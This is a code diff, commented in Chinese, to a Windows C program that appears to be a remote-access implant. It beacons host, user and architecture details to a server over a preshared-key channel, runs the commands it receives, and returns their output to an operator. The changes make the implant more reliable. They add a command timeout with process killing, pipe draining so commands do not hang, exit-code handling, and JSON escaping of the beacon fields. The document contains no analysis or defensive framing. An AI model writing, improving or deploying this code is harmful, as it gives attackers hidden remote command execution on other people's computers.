@@ -56,6 +56,7 @@
 
 #define OUT_MAX 65536
 #define HTTP_BUF_MAX 262144
+#define CMD_TIMEOUT_MS 60000
 
 static uint8_t PSK[32];
 
@@ -249,6 +250,25 @@ static int http_post(const char *path, const uint8_t *body, size_t body_len,
 
 /* ---------- 命令执行（管道捕获，输出并入 stderr） ---------- */
 
+/* 从管道读一次：缓冲有剩余空间就写入 out（推进 *total），写满则读入 discard 丢弃。
+ * 返回 0 表示 EOF/读失败（子进程输出结束），1 表示读到数据。 */
+static int pipe_read_once(HANDLE pipe, char *out, size_t out_max, size_t *total,
+                          char *discard, DWORD discard_max)
+{
+    char *dst;
+    DWORD cap, n = 0;
+    if (*total + 1 < out_max) {
+        dst = out + *total;
+        cap = (DWORD)(out_max - *total - 1);
+    } else {
+        dst = discard;
+        cap = discard_max;
+    }
+    if (!ReadFile(pipe, dst, cap, &n, NULL) || n == 0) return 0;
+    if (dst != discard) *total += n;
+    return 1;
+}
+
 static int run_cmd(const char *command, char *out, size_t out_max, int *exit_code)
 {
     SECURITY_ATTRIBUTES sa;
@@ -277,21 +297,54 @@ static int run_cmd(const char *command, char *out, size_t out_max, int *exit_cod
     CloseHandle(out_wr);
     free(cmdline);
 
+    /* 读循环（60s 截止，GetTickCount 回绕安全的差值比较）：
+     * - 缓冲写满后继续 drain 管道（丢弃超额字节），子进程不会因写满的管道被永久阻塞；
+     * - 进程退出后排空管道剩余输出再收尾；
+     * - 超过截止时间仍存活则 TerminateProcess 并标注。 */
+    DWORD deadline = GetTickCount() + CMD_TIMEOUT_MS;
     size_t total = 0;
-    DWORD n;
-    while (total + 1 < out_max
-           && ReadFile(out_rd, out + total, (DWORD)(out_max - total - 1), &n, NULL)
-           && n) {
-        total += n;
+    int timed_out = 0;
+    char discard[4096];
+    for (;;) {
+        if ((DWORD)(GetTickCount() - deadline) < 0x80000000U) { timed_out = 1; break; }
+        DWORD avail = 0;
+        if (!PeekNamedPipe(out_rd, NULL, 0, NULL, &avail, NULL)) break;  /* 写端关闭 = EOF */
+        if (avail) {
+            if (!pipe_read_once(out_rd, out, out_max, &total, discard, (DWORD)sizeof discard))
+                break;
+            continue;
+        }
+        if (WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0) {
+            /* 进程已退出：管道还有剩余字节就继续排空，否则收尾 */
+            DWORD rest = 0;
+            if (!PeekNamedPipe(out_rd, NULL, 0, NULL, &rest, NULL) || !rest) break;
+            continue;
+        }
     }
-    WaitForSingleObject(pi.hProcess, 60000);
+
+    if (timed_out) {
+        TerminateProcess(pi.hProcess, (UINT)-1);
+        WaitForSingleObject(pi.hProcess, 5000);  /* 等句柄终止，避免僵尸 */
+    }
     DWORD code = 0;
     GetExitCodeProcess(pi.hProcess, &code);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
     CloseHandle(out_rd);
     out[total] = 0;
-    *exit_code = (int)code;
+    if (timed_out) {
+        /* 超时被杀的进程没有可信退出码；输出标注供 operator 判断 */
+        const char *note = "\n(timeout killed)";
+        size_t note_len = strlen(note);
+        size_t room = out_max - 1 - total;
+        size_t copy = note_len < room ? note_len : room;
+        if (copy) { memcpy(out + total, note, copy); total += copy; }
+        out[total] = 0;
+        *exit_code = -1;
+    } else {
+        /* STILL_ACTIVE(259) 是"仍在运行"哨兵值，不得当真实退出码上报 */
+        *exit_code = (code == STILL_ACTIVE) ? -1 : (int)code;
+    }
     return 0;
 }
 
@@ -300,9 +353,17 @@ static int run_cmd(const char *command, char *out, size_t out_max, int *exit_cod
 static void build_beacon_json(char *buf, size_t buf_max, const char *id,
                               const char *host, const char *user, const char *arch, int sleep)
 {
+    /* 全部字段先 json_escape 再拼装：含引号/反斜杠/控制字符的主机名、用户名
+     * 或架构串不再破坏 JSON 结构（服务端 json.loads 直接拒收注册）。
+     * 缓冲按最坏情况 ×6（\u00XX 六字节/字符），与 main 里 id/host/user/arch 数组等长。 */
+    char e_host[64 * 6], e_user[64 * 6], e_arch[32 * 6], e_id[96 * 6];
+    json_escape(host, strlen(host), e_host, sizeof e_host);
+    json_escape(user, strlen(user), e_user, sizeof e_user);
+    json_escape(arch, strlen(arch), e_arch, sizeof e_arch);
+    json_escape(id, strlen(id), e_id, sizeof e_id);
     snprintf(buf, buf_max,
              "{\"id\":\"%s\",\"host\":\"%s\",\"user\":\"%s\",\"arch\":\"%s\",\"sleep\":%d}",
-             id, host, user, arch, sleep);
+             e_id, e_host, e_user, e_arch, sleep);
 }
 
 int main(void)
@@ -330,13 +391,14 @@ int main(void)
     uint8_t *req = (uint8_t *)malloc(HTTP_BUF_MAX);
     uint8_t *resp = (uint8_t *)malloc(HTTP_BUF_MAX);
     uint8_t *plain = (uint8_t *)malloc(HTTP_BUF_MAX);
-    char *beacon_json = (char *)malloc(512);
+    /* 4096：最坏情况（转义后 id+host+user+arch ≈ 1.5KB）也不截断 sleep 字段 */
+    char *beacon_json = (char *)malloc(4096);
     char *command = (char *)malloc(16384);
     char *escaped = (char *)malloc(OUT_MAX * 6 + 16);
     char *result_json = (char *)malloc(OUT_MAX * 6 + 256);
 
     for (;;) {
-        build_beacon_json(beacon_json, 512, id, host, user, arch, sleep_s);
+        build_beacon_json(beacon_json, 4096, id, host, user, arch, sleep_s);
         size_t sealed_len = 0, resp_len = 0, plain_len = 0;
         int have_tasks = 0;
         if (cmt1_seal(PSK, (const uint8_t *)beacon_json, strlen(beacon_json),
